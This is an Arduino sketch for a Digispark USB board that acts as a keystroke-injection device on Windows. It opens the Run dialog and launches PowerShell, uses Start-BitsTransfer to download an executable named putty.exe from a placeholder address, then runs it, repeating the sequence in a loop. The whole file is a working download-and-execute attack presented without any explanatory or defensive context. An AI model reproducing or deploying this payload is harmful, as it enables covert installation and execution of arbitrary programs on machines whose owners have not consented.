#define kbd_tr_tr
#include "DigiKeyboard.h"
void setup() {

}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.print("Start-BitsTransfer putty.exe_address putty.exe");
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(6000);
  DigiKeyboard.print("putty.exe");
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
}
